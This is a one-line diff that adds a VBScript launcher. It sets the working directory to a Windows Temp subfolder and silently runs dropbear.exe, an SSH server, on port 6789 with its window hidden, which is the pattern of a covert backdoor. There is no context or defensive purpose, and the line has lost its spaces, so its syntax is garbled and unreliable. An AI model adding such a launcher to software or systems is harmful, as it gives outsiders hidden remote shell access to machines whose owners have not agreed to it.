@@ -1,0 +1,1 @@
+SetWshShell=CreateObject("WScript.Shell")WshShell.CurrentDirectory="C:\WINDOWS\TEMP\Dropbear"WshShell.Run"dropbear.exe-rrsa-ddss-a-p6789",0,false
